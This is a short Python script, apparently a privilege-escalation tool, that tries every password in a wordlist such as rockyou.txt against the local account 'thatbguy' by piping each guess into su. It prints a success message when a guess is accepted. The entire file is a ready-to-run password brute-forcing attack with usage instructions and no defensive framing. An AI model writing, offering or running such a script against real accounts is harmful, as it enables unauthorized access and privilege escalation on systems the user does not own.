#!/usr/bin/env python

# How to use this script:
# 1. You need to have a wordlist file, something like rockyou.txt
# 2. Make sure you have Python 3 installed. Try this with "python --version" command. Also check "python3 --version"
# 3. Run the script like this: python sudo_brute_force.py passwords.txt

import os
import sys
import subprocess

if len(sys.argv) == 1:
    print("You need to add a wordlist! Run the script like this: python sudo_brute_force.py passwords.txt")
    exit()

wordfile = sys.argv[1]

print("Brute force su password with wordlist {}".format(wordfile))
print("")

with open(wordfile, "r") as wordlist:
    for password in wordlist:
        print(password)

        p = subprocess.Popen(['su', 'thatbguy'],
                     stdin=subprocess.PIPE, stdout=subprocess.PIPE)
        stdout, stderr = p.communicate(input=password.strip())

        if not p.returncode:
            print("Success! :) The password is: {}".format(password))
            break
        else:
            print("Wrong password... :( Let's try again!")
            print("")
